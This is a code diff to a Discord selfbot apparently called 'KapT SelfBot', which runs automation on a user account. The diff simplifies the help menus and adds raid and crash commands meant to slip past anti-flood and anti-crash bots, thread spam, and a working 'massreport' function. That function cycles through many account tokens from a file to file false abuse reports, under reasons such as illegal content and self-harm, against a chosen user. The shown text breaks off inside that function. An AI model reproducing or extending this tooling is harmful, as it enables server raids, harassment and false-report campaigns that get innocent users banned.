@@ -3,6 +3,9 @@ from discord.ext import commands
 from discord.ext.commands import *
 from colorama import Fore, Style
 from gtts import gTTS
+import threading
+from asyncio import create_task
+from threading import Thread, Lock
 import random
 import datetime
 import string
@@ -10,8 +13,10 @@ import asyncio
 import json
 import requests
 import urllib
+import time
 import os
-
+import requests as rq
+from prettytable import PrettyTable
 
 class SELFBOT():
     __version__ = 1
@@ -26,7 +31,9 @@ with open("cong.json") as f:
 client = commands.Bot(command_prefix=prefix, self_bot=True)
 client.remove_command("help")
 
-# Events
+# Events         
+
+
 
 @client.event
 async def on_ready():
@@ -44,38 +51,23 @@ async def on_ready():
 			)
 		)
 print(Fore.GREEN + f"""
-██╗░░██╗░░░░░░██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗
-██║░██╔╝░░░░░░██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝
-█████═╝░█████╗██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░
-██╔═██╗░╚════╝██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░
-██║░╚██╗░░░░░░██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░
-╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░
-{Fore.GREEN}\n\nLogged In As This Random: {Fore.RED}[{Fore.BLUE}{client.user.name}#{client.user.discriminator}{Fore.RED}]{Fore.GREEN}\nYour ID is: {Fore.RED}[{Fore.BLUE}{client.user.id}{Fore.RED}]\n\n{Fore.RED}----------CREDITS MADE BY KapT----------{Fore.BLUE}\n\n{Fore.RED}{Fore.GREEN}__KapT SelfBot V{SELFBOT.__version__}, 50+ Commands\nMade By KapT.{Fore.RED}\n\n------------------------"""
-          )
+|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+|                                                                           |
+|  ██╗░░██╗░░░░░░██████╗░██████╗░░█████╗░░░░░░██╗███████╗░█████╗░████████╗  |
+|  ██║░██╔╝░░░░░░██╔══██╗██╔══██╗██╔══██╗░░░░░██║██╔════╝██╔══██╗╚══██╔══╝  |
+|  █████═╝░█████╗██████╔╝██████╔╝██║░░██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░  |
+|  ██╔═██╗░╚════╝██╔═══╝░██╔══██╗██║░░██║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░  |
+|  ██║░╚██╗░░░░░░██║░░░░░██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝░░░██║░░░  |
+|  ╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░  |
+|                                                                           |
+|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+|                       https://t.me/kapt_self_bot                          |
+|                            𝘽𝙮 𝙆𝙖𝙥𝙏                                       | 
+|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|
+|                           {Fore.RED}PREFIX: {prefix}{Fore.GREEN}                                  |
+|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|""")
 
-@client.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.MissingPermissions):
-        try:
-            embed = discord.Embed(
-                color=discord.Colour.from_rgb(255, 0, 0),
-                description=
-                "`Missing Permissions, You're Missing The Permissions Necessary To Use This Command`"
-            )
-            embed.set_author(name="Missing Permissions")
-            await ctx.send(embed=embed)
-        except:
-            await ctx.send(
-                """You're Missing Permissions To Execute This Command""")
-    if isinstance(error, commands.MissingRequiredArgument):
-        try:
-            embed = discord.Embed(
-                color=discord.Colour.from_rgb(255, 0, 0),
-                description="Missing Required Argument, Try Again?")
-            embed.set_author(name="Missing Required Argument")
-            await ctx.send(embed=embed)
-        except:
-            await ctx.send("Missing Required Argument")
+
 
 
 # Other Shit
@@ -115,46 +107,7 @@ locales = [
 @client.command()
 async def help(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_author(name="KapT 𝐒𝐞𝐥𝐟 𝐁𝐨𝐭", icon_url=ctx.author.avatar_url)
-        embed.set_footer(text="KapT Self Bot")
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://media.tenor.co/videos/726c00ca7f375035bf2c599e6ed7d6fe/mp4"
-        )
-        embed.add_field(name="*♦ KapT 𝖒𝖔𝖉 *",
-                        value="`Shows The Moderation Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝑴𝒊𝒔𝒄𝒆𝒍𝒍𝒂𝒏𝒆𝒐𝒖𝒔 *",
-                        value="`Shows The Miscellaneous Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖀𝖙𝖎𝖑𝖎𝖙𝖞*",
-                        value="`Shows The Utility Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖘𝖙𝖆𝖙𝖚𝖘*",
-                        value="`Shows The Status Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖓𝖚𝖐𝖊*",
-                        value="`Shows The Nuke Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖕𝖊𝖗𝖘𝖔𝖓𝖆𝖑*",
-                        value="`Shows The Personal Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖒𝖆𝖙𝖍*",
-                        value="`Shows The Math Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖘𝖊𝖗𝖛𝖊𝖗*",
-                        value="`Shows The Server Commands`",
-                        inline=False)
-        embed.add_field(name="*♦ KapT 𝖓𝖋𝖘𝖜*",
-                        value="`Shows The NSFW Commands`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Help__**\n
+    await ctx.send("""**__KapT SelfBot Help__**\n
 **Moderation**
 `Shows The Moderation Commands`
 **Miscellaneous**
@@ -171,47 +124,13 @@ async def help(ctx):
 `Shows The Math Commands`
 **Server**
 `Shows The Server Commands`
-**NSFW**
-`Shows The NSFW Commands`""")
+""")
 
 
 @client.command(aliases=["mod"])
 async def moderation(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              description="*[] Is Required, <> Is Optional*",
-                              timestamp=ctx.message.created_at)
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_author(name="𝙈𝙊𝘿𝙀𝙍𝘼𝙏𝙄𝙊𝙉", icon_url=ctx.author.avatar_url)
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.add_field(name="*♦ Ban [member]*",
-                        value="`Bans The Specified Member`",
-                        inline=False)
-        embed.add_field(name="*♦ Kick [member]*",
-                        value="`Kicks The Specified Member`",
-                        inline=False)
-        embed.add_field(
-            name="*♦ AR [member] [role]*",
-            value="`Adds The Specified Role To The Specified Member`",
-            inline=False)
-        embed.add_field(
-            name="*♦ TR [member] [role]*",
-            value="`Takes The Specified Role From The Specified Member`",
-            inline=False)
-        embed.add_field(name="*♦ Mute [member]*",
-                        value="`Mutes The Specified Member`",
-                        inline=False)
-        embed.add_field(name="*♦ Purge <amount>*",
-                        value="`Purges The Specified Amount Of Messages`",
-                        inline=False)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831188629333344286/nbayoungman.gif"
-        )
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Moderation__**\n
+    await ctx.send("""**__KapT SelfBot Moderation__**\n
 *[] Is Required, <> Is Optional*
 **Ban [member]**
 `Bans The Specified Member`
@@ -230,35 +149,7 @@ async def moderation(ctx):
 @client.command()
 async def status(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at,
-                              description="*[] Is Required, <> Is Optional*")
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_author(name="𝙎𝙏𝘼𝙏𝙐𝙎", icon_url=ctx.author.avatar_url)
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831270357763751956/rondo2.gif"
-        )
-        embed.add_field(name="*♦ Game*",
-                        value="`Changes Your Status To A Game`",
-                        inline=False)
-        embed.add_field(name="*♦ Stream*",
-                        value="`Changes Your Status To A Stream`",
-                        inline=False)
-        embed.add_field(name="*♦ Listen*",
-                        value="`Changes Your Status To Listening`",
-                        inline=False)
-        embed.add_field(name="*♦ Watch*",
-                        value="`Changes Your Status To Watching`",
-                        inline=False)
-        embed.add_field(name="*♦ Clear*",
-                        value="`Clears Your Custom Status`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Status__**\n
+    await ctx.send("""**__KapT SelfBot Status__**\n
 [] Is Required, <> Is Optional*
 **Game**
 `Changes Your Status To A Game`
@@ -275,40 +166,7 @@ async def status(ctx):
 @client.command()
 async def utility(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at,
-                              description="*[] Is Required, <> Is Optional*")
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_author(name="𝙐𝙏𝙄𝙇𝙄𝙏𝙔", icon_url=ctx.author.avatar_url)
-        embed.set_image(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831269766232145930/quando.gif"
-        )
-        embed.add_field(name="*♦ AV <member>*",
-                        value="`Shows The Mentioned Members Avatar`",
-                        inline=False)
-        embed.add_field(name="*♦ Creator*",
-                        value="`Shows This SelfBots Creator`",
-                        inline=False)
-        embed.add_field(name="*♦ Ping*",
-                        value="`Shows The Clients Latency`",
-                        inline=False)
-        embed.add_field(name="*♦ Info*",
-                        value="`Shows Some Info About Yourself`",
-                        inline=False)
-        embed.add_field(name="*♦ Tts <lang> <message>*",
-                        value="`Sends a Message In Text to Speech`",
-                        inline=False)
-        embed.add_field(
-            name="*♦ 𝘿𝙪𝙢𝙥𝙚𝙢𝙤𝙟𝙞𝙨 <𝙨𝙚𝙧𝙫𝙚𝙧𝙞𝙙>*",
-            value=
-            "`Dumps the emojis of the specified server into the emojis file`",
-            inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Utility__**\n
+    await ctx.send("""**__KapT SelfBot Utility__**\n
 *[] Is Required, <> Is Optional*
 **AV <member>**
 `Shows The Mentioned Users Avatar`
@@ -325,49 +183,7 @@ async def utility(ctx):
 @client.command(aliases=["misc"])
 async def miscellaneous(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at,
-                              description="*[] Is Required, <> Is Optional*")
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_author(name="𝙈𝙄𝙎𝘾𝙀𝙇𝙇𝘼𝙉𝙀𝙇𝙊𝙐𝙎", icon_url=ctx.author.avatar_url)
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831269063257751633/lilbaby.gif"
-        )
-        embed.add_field(
-            name="*♦ Hug [member] <member>*",
-            value="`Sends a gif of hugging the mentioned members/member`",
-            inline=False)
-        embed.add_field(
-            name="*♦ Kiss [member] <member>*",
-            value="`Sends a gif of kissing the mentioned members/member`",
-            inline=False)
-        embed.add_field(name="*♦ Spam [text]*",
-                        value="`Spams The Specified Text`",
-                        inline=False)
-        embed.add_field(name="*♦ Ascii [text]*",
-                        value="`Sends The Specified Text In Ascii`",
-                        inline=False)
-        embed.add_field(
-            name="*♦ Wizz*",
-            value="`Fake Wizzes The Server, Only Meant To Scare Friends`",
-            inline=False)
-        embed.add_field(
-            name="*♦ Dmlist [message]*",
-            value="`DMs Everyone On Your DMs List The Desired Message`",
-            inline=False)
-        embed.add_field(
-            name="*♦ Dmfriends [message]*",
-            value="`DMs Everyone On Your Friends List The Desired Message`",
-            inline=False)
-        embed.add_field(name="*♦ Tokeninfo [token]*",
-                        value="`Checks The Desired Token`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Miscellaneous__**\n
+    await ctx.send("""**__KapT SelfBot Miscellaneous__**\n
 *[] Is Required, <> Is Optional*
 **Hug [member] <member>**
 `Sends a gif of hugging the mentioned members/member`
@@ -381,52 +197,10 @@ async def miscellaneous(ctx):
 `DMs Everyone On Your DMs List The Desired Message`
 **Dmfriends [message]**
 `DMs Everyone On Your Friends List The Desired Message`
-**Tokeninfo [token]**
-`Checks The Desired Token`""")
+**Deletedms**
+`Deletes all dms with people who have the word "spam" in their nickname`
+""")
 
-
-@client.command()
-async def nsfw(ctx):
-    await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831730772250722324/giphy-downsized.gif"
-        )
-        embed.set_author(name="Sexy __KapT", icon_url=ctx.author.avatar_url)
-        embed.add_field(name="*♦ Hentai*",
-                        value="`Sends A Hentai Image`",
-                        inline=False)
-        embed.add_field(name="*♦ Sex*",
-                        value="`Sends A Sex Image`",
-                        inline=False)
-        embed.add_field(name="*♦ Tits*",
-                        value="`Sends A Tit Image`",
-                        inline=False)
-        embed.add_field(name="*♦ Pussy*",
-                        value="`Sends A Pussy Image`",
-                        inline=False)
-        embed.add_field(name="*♦ Dick*",
-                        value="`Sends A Dick Image`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot NSFW__**\n
-*[] Is Required, <> Is Optional*
-**Hentai**
-`Sends A Hentai Image`
-**Sex**
-`Sends A Sex Image`
-**Tits**
-`Sends A Tit Image`
-**Pussy**
-`Sends A Pussy Image`
-**Dick**
-`Sends A Dick Image`""")
 
 
 
@@ -451,48 +225,29 @@ async def nuke(ctx):
 `Prints Out All Server Roles`
 **Spam [count] [text]**
 `Start spamming with selected number of times and your text`
-**Bypass**
+**Anticrash**
 `Start server crash by bypassing some anticrash bots`
 **Auto**
 `Start auto crash`
 **Hookall**
 `Start spamming webhooks to all channels`
-**Spamv2**
-`Start spaming in channel`""")
+**Bypass_spam [count] [text]**
+`Start server raid by bypassing some antiflood bots`
+**Spamall [count] [text]**
+`Start server raid by bypassing some antiflood bots (in all channels)`
+**Fastauto**
+`Start fast crash`
+**Threadspam [count]**
+`Spam thread in the channel`
+**Massreport [user] [count]**
+`Mass reports per user and server` 
+""")
 
 
 @client.command()
 async def math(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at,
-                              description="*[] Is Required, <> Is Optional*")
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831729676375949363/cartierfucker.gif"
-        )
-        embed.set_author(name="𝙈𝘼𝙏𝙃", icon_url=ctx.author.avatar_url)
-        embed.add_field(name="*♦ Add [number] [number]*",
-                        value="`Adds The Two Desired Numbers`",
-                        inline=False)
-        embed.add_field(name="*♦ Subtract [number] [number]*",
-                        value="`Subtracts The Two Desired Numbers`",
-                        inline=False)
-        embed.add_field(name="*♦ Multiply [number] [number]*",
-                        value="`Multiplies The Two Desired Numbers`",
-                        inline=False)
-        embed.add_field(name="*♦ Divide [number] [number]*",
-                        value="`Divides The Two Desired Numbers`",
-                        inline=False)
-        embed.add_field(
-            name="*♦ Calculator [numbers]*",
-            value="`Calculates The Numbers and Operators\nExample: 7*2/2`")
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Math__**\n
+    await ctx.send("""**__KapT SelfBot Math__**\n
 *[] Is Required, <> Is Optional*
 **Add [number] [number]**
 `Adds The Two Desired Numbers`
@@ -509,39 +264,7 @@ async def math(ctx):
 @client.command()
 async def server(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831730518365437952/f9dc7f72bc9a1f039410755aca3306ed.gif"
-        )
-        embed.set_author(name="𝙎𝙀𝙍𝙑𝙀𝙍", icon_url=ctx.author.avatar_url)
-        embed.add_field(name="*♦ Servericon*",
-                        value="`Sends The Server Icon`",
-                        inline=False)
-        embed.add_field(name="*♦ Serverbanner*",
-                        value="`Sends The Server Banner`",
-                        inline=False)
-        embed.add_field(name="*♦ Servername*",
-                        value="`Sends The Server Name`",
-                        inline=False)
-        embed.add_field(name="*♦ Serverinfo*",
-                        value="`Sends The Servers Info`",
-                        inline=False)
-        embed.add_field(name="*♦ Serverroles*",
-                        value="`Sends a List of The Servers Roles`")
-        embed.add_field(name="*♦ Serverchannels*",
-                        value="`Sends a List of The Servers Channels`",
-                        inline=False)
-        embed.add_field(name="*♦ Copy*",
-                        value="`Makes An Exact Copy of The Server`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Server__**\n
+    await ctx.send("""**__KapT SelfBot Server__**\n
 *[] Is Required, <> Is Optional*
 **Servericon**
 `Sends The Server Icon`
@@ -556,43 +279,19 @@ async def server(ctx):
 **Serverchannels**
 `Sends A List Of The Servers Channels`
 **Copy**
-`Makes An Exact Copy Of The Server`""")
+`Makes An Exact Copy Of The Server`
+**Leave**
+`Command for the server leaving`
+**Invite [invite]**
+`Command for information about the invite`
+**Clonechannel**
+`Command for cloning channel`""")
 
 
 @client.command()
 async def personal(ctx):
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0),
-                              timestamp=ctx.message.created_at)
-        embed.set_footer(text="KapT SelfBot")
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.set_image(
-            url=
-            "https://cdn.discordapp.com/attachments/823051201192919136/831728923683061760/6666624671237135865-1499067990.gif"
-        )
-        embed.set_author(name="𝙋𝙀𝙍𝙎𝙊𝙉𝘼𝙇", icon_url=ctx.author.avatar_url)
-        embed.add_field(name="*♦ Guilds*",
-                        value="`Displays All The Guilds You're In`",
-                        inline=False)
-        embed.add_field(name="*♦ Prefix*",
-                        value="`Shows The Prefix`",
-                        inline=False)
-        embed.add_field(name="*♦ Myroles*",
-                        value="`Shows All The Roles You Have`",
-                        inline=False)
-        embed.add_field(name="*♦ Nick [nickname]*",
-                        value="`Changes Your Nickname`",
-                        inline=False)
-        embed.add_field(name="*♦ Nickreset*",
-                        value="`Resets Your Nickname`",
-                        inline=False)
-        embed.add_field(name="*♦ Friendbackup*",
-                        value="`Backups your friends list in Friends.txt`",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send("""**__KapT SelfBot Personal__**\n
+    await ctx.send("""**__KapT SelfBot Personal__**\n
 *[] Is Required, <> Is Optional*
 **Guilds**
 `Displays All The Guilds You're In`
@@ -622,7 +321,6 @@ async def personal(ctx):
 async def ban(ctx, member: discord.Member, *, reason):
     await ctx.message.delete()
     await member.ban(reason=reason)
-
 
 @client.command()
 @commands.has_permissions(kick_members=True)
@@ -657,7 +355,7 @@ async def mute(ctx, member: discord.Member):
 
 
 @client.command()
-async def purge(ctx, amount=100):
+async def purge(ctx, amount: int):
     await ctx.message.delete()
     await ctx.channel.purge(limit=amount)
 
@@ -668,34 +366,20 @@ async def purge(ctx, amount=100):
 @client.command()
 async def hug(ctx, member: discord.Member, user: discord.Member = None):
     await ctx.message.delete()
-    try:
-        user = ctx.author if not user else user
-        hugg = requests.get("https://nekos.life/api/v2/img/hug")
-        res = hugg.json()
-        embed = discord.Embed(
-            description=f"{user.mention} Hugs {member.mention}",
-            color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""{user.mention} Hugs {member.mention}\n\n""" +
+    user = ctx.author if not user else user
+    hugg = requests.get("https://nekos.life/api/v2/img/hug")
+    res = hugg.json()
+    await ctx.send(f"""{user.mention} Hugs {member.mention}\n\n""" +
                        res["url"])
 
 
 @client.command()
 async def kiss(ctx, member: discord.Member, user: discord.Member = None):
     await ctx.message.delete()
-    try:
-        user = ctx.author if not user else user
-        kisss = requests.get("https://nekos.life/api/v2/img/kiss")
-        res = kisss.json()
-        embed = discord.Embed(
-            description=f"{user.mention} Kisses {member.mention}",
-            color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_image(url=res["url"])
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""{user.mention} Kisses {member.mention}\n\n""" +
+    user = ctx.author if not user else user
+    kisss = requests.get("https://nekos.life/api/v2/img/kiss")
+    res = kisss.json()
+    await ctx.send(f"""{user.mention} Kisses {member.mention}\n\n""" +
                        res["url"])
 
 @client.command()
@@ -789,115 +473,17 @@ async def dmfriends(ctx, *, x):
 
 
 @client.command()
-async def tokeninfo(ctx, _token):
-    await ctx.message.delete()
-    headers = {'Authorization': _token, 'Content-Type': 'application/json'}
-    try:
-        res = requests.get('https://canary.discordapp.com/api/v6/users/@me',
-                           headers=headers)
-        res = res.json()
-        user_id = res['id']
-        locale = res['locale']
-        avatar_id = res['avatar']
-        language = languages.get(locale)
-        creation_date = datetime.datetime.utcfromtimestamp(
-            ((int(user_id) >> 22) + 1420070400000) /
-            1000).strftime('%d-%m-%Y %H:%M:%S UTC')
-    except KeyError:
-        headers = {
-            'Authorization': "Bot " + _token,
-            'Content-Type': 'application/json'
-        }
-        try:
-            res = requests.get(
-                'https://canary.discordapp.com/api/v6/users/@me',
-                headers=headers)
-            res = res.json()
-            user_id = res['id']
-            locale = res['locale']
-            avatar_id = res['avatar']
-            language = languages.get(locale)
-            creation_date = datetime.datetime.utcfromtimestamp(
-                ((int(user_id) >> 22) + 1420070400000) /
-                1000).strftime('%d-%m-%Y %H:%M:%S UTC')
-            em = discord.Embed(
-                color=0x2f3136,
-                description=
-                f"Name: `{res['username']}#{res['discriminator']} ` **(BOT**)\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`"
-            )
-            fields = [
-                {
-                    'name': 'Flags',
-                    'value': res['flags']
-                },
-                {
-                    'name': 'Local language',
-                    'value': res['locale'] + f"{language}"
-                },
-                {
-                    'name': 'Verified',
-                    'value': res['verified']
-                },
-            ]
-            for field in fields:
-                if field['value']:
-                    em.add_field(name=field['name'],
-                                 value=field['value'],
-                                 inline=False)
-                    em.set_thumbnail(
-                        url=
-                        f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
-                    )
-            return await ctx.send(embed=em)
-        except KeyError:
-            await ctx.send("Invalid token")
-    em = discord.Embed(
-        color=0x2f3136,
-        description=
-        f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`",
-        timestamp=ctx.message.created_at)
-    nitro_type = "None"
-    if "premium_type" in res:
-        if res['premium_type'] == 2:
-            nitro_type = "Nitro Premium"
-        elif res['premium_type'] == 1:
-            nitro_type = "Nitro Classic"
-    fields = [
-        {
-            'name': 'Phone',
-            'value': res['phone']
-        },
-        {
-            'name': 'Flags',
-            'value': res['flags']
-        },
-        {
-            'name': 'Local language',
-            'value': res['locale'] + f"{language}"
-        },
-        {
-            'name': 'MFA',
-            'value': res['mfa_enabled']
-        },
-        {
-            'name': 'Verified',
-            'value': res['verified']
-        },
-        {
-            'name': 'Nitro',
-            'value': nitro_type
-        },
-    ]
-    for field in fields:
-        if field['value']:
-            em.add_field(name=field['name'],
-                         value=field['value'],
-                         inline=False)
-            em.set_thumbnail(
-                url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}"
-            )
-    return await ctx.send(embed=em)
-
+async def deletedms(ctx, name='spam'):
+	await ctx.message.delete()
+	removed=0
+	for dm in client.private_channels:
+		if name.lower() in str(dm).lower():
+			while True:
+				response=requests.delete(f"https://discord.com/api/v9/channels/{dm.id}", headers={'authorization': token})
+				if response!=401: break
+				sleep(response.json()['retry_after'])
+			removed+=1
+	await ctx.send(f"**Successfully removed {removed} dms!**")
 
 # Utility
 
@@ -906,12 +492,7 @@ async def tokeninfo(ctx, _token):
 async def av(ctx, member: discord.Member = None):
     member = ctx.author if not member else member
     await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_image(url=member.avatar_url)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"{member.avatar_url}")
+    ctx.send(f"{member.avatar_url}")
 
 
 @client.command()
@@ -924,23 +505,8 @@ async def ping(ctx):
 
 @client.command()
 async def info(ctx):
-    await ctx.message.delete()
-    try:
-        embed = discord.Embed(color=discord.Colour.from_rgb(255, 0, 0))
-        embed.set_author(name=f"{ctx.author}'s Info!",
-                         icon_url=ctx.author.avatar_url)
-        embed.set_thumbnail(url=ctx.author.avatar_url)
-        embed.add_field(name="**Username:**",
-                        value=client.user.name,
-                        inline=False)
-        embed.add_field(name="**ID:**", value=client.user.id, inline=False)
-        embed.add_field(name="**Servers:**",
-                        value=f"{len(client.guilds)}",
-                        inline=False)
-        await ctx.send(embed=embed)
-    except:
-        await ctx.send(f"""**__{ctx.author}'s Info!__**
-      
+    await ctx.send(f"""**__{ctx.author}'s Info!__**
+
 **Username:**
 `{client.user.name}`
 **ID:**
@@ -1085,6 +651,112 @@ async def dchan(ctx):
             print(f"Can't Delete {channel}")
             continue
 
+@client.command()
+async def massreport(ctx, count = 10, member: discord.Member = None):
+    if member: pass
+    elif ctx.message.reference:
+        try: 
+            async for message in ctx.history():
+                if message.id == ctx.message.reference.message_id:
+                    member = await ctx.guild.fetch_member(message.author)
+                    break
+        except: return await ctx.message.edit(content = "Failed to get target user.")
+    else: return await ctx.message.edit(content = "Target user not specified! Reply to a message sent by the target user or provide it as a command argument (Usage: `.massreport [number] [@user]`).")
+    await ctx.message.edit(content = f"Mass report {member.mention} started. Please wait...")
+    start_time1 = round(time.time())
+    start_time1_fmt = datetime.datetime.fromtimestamp(start_time1).strftime("%Y/%m/%d %H:%M:%S.%f")
+    tokens_array = open("tokens.txt", "r").read().split("\n")
+    log_table = PrettyTable(["№ report", "Report time", "Token number", "Reason", "Report status", "Channel ID", "Message ID"])
+    log_table.sortby = "№ report"
+    log_table.align = 'l'
+    log_text = f'''**__Mass Reporter by KapT Self-Bot__
+Reporter start time: {start_time1_fmt} UTC
+Target user: {member.display_name}#{member.discriminator} ({member.id})
+Destination server: {member.guild.name} ({member.guild.id})
+Number of reports per user: {count}
+Number of reporter tokens: {len(tokens_array)}
+
+Some explanations:
+report number - serial number of the report
+Report time - the amount of time elapsed since the start of the reporter (this is the difference)
+token number - serial number of the reporter token that made the report
+Reason - random reason for the message report
+Report status - Successful or not
+Channel ID - Channel ID that was specified in this report
+Message ID - ID of the message that was specified in this report**'''
+    collected_messages = []
+    async for message in ctx.history(limit = 1000):
+        if message.author == member:
+            collected_messages.append(message.id)
+    current_report = 1
+    reason_dict = {
+        "0": "Illegal content",
+        "1": "Harrasment",
+        "2": "Spam or phishing links",
+        "3": "Self-harm",
+        "4": "NSFW Content"
+    }
+    for _ in range(count):
+        tkn = random.choice(tokens_array)
+        msg = random.choice(collected_messages)
+        rep = send_report(
+            tkn,
+            ctx.guild.id,
+            ctx.channel.id,
+            msg
+        )
+        if rep[0] == True:
+            diff = round(time.time()) - start_time1
+            if diff > 60: diffmins = diff / 60
+            else: diffmins = 0
+            diff = diff % 60
+            if diff < 10: diff = f"0{diff}"
+            log_table.add_row([
+                    current_report,
+                    f"+{diffmins}:{diff}",
+                    tokens_array.index(tkn),
+                    reason_dict[str(rep[1])],
+                    "OK",
+                    ctx.channel.id,
+                    msg
+            ])
+        elif rep[0] == False:
+            diff = round(time.time()) - start_time1
+            if diff > 60: diffmins = diff / 60
+            else: diffmins = 0
+            diff = diff % 60
+            if diff < 10: diff = f"0{diff}"
+            log_table.add_row([
+                    current_report,
+                    f"+{diffmins}:{diff}",
+                    tokens_array.index(tkn),
+                    reason_dict[str(rep[1])],
+                    "FAIL",
+                    ctx.channel.id,
+                    msg
+            ])
+        else:
+            diff = round(time.time()) - start_time1
+            if diff > 60: diffmins = diff / 60
+            else: diffmins = 0
+            diff = diff % 60
+            if diff < 10: diff = f"0{diff}"
+            log_table.add_row([
+                    current_report,
+                    f"+{diffmins}:{diff}",
+                    tokens_array.index(tkn),
+                    reason_dict[str(rep[1])],
+                    rep[0],
+                    ctx.channel.id,
+                    msg
+            ])
+        current_report += 1
+    log_filename = 'test'
